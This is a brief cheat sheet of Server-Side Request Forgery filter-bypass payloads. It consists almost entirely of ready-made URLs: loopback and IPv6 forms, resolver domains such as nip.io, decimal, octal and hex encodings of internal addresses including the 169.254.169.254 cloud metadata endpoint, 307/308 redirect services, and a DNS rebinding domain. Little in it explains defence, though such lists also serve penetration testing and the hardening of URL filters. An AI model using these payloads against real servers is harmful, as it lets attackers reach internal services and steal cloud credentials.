SSRF Bypass Techniques

Comprehensive Server-Side Request Forgery filter bypass methods and exploitation vectors.

Default Targets

Using localhost

http://localhost:80
http://localhost:22
https://localhost:443

Using 127.0.0.1

http://127.0.0.1:80
http://127.0.0.1:22
https://127.0.0.1:443

Using 0.0.0.0

http://0.0.0.0:80
http://0.0.0.0:22
https://0.0.0.0:443

Bypass with IPv6 Notation

http://[::]:80/
http://[0000::1]:80/
http://[0:0:0:0:0:ffff:127.0.0.1]
http://[::ffff:127.0.0.1]

Bypass with Domain Redirect

Domain Redirects To
localtest.me ::1
localh.st 127.0.0.1
company.127.0.0.1.nip.io 127.0.0.1

Service: nip.io maps anything.IP.nip.io to the corresponding IP

Bypass with CIDR

127.0.0.0/8 is reserved for loopback addresses:

http://127.127.127.127
http://127.0.1.3
http://127.0.0.0

Rare Address Shortcuts

http://0/
http://127.1
http://127.0.1

Encoded IP Addresses

Decimal

http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1
http://2852039166/ = http://169.254.169.254

Octal

http://0177.0.0.1/ = http://127.0.0.1
http://o177.0.0.1/ = http://127.0.0.1
http://0o177.0.0.1/ = http://127.0.0.1

Hexadecimal

http://0x7f000001 = http://127.0.0.1
http://0xc0a80101 = http://192.168.1.1
http://0xa9fea9fe = http://169.254.169.254

Bypass Using Redirect

Use HTTP 307/308 to retain method and body after redirect:

https://307.r3dir.me/--to/?url=http://localhost
https://62epax5fhvj3zzmzigyoe5ipkbn7fysllvges3a.302.r3dir.me

DNS Rebinding

Create a domain that rotates between two IPs:

make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
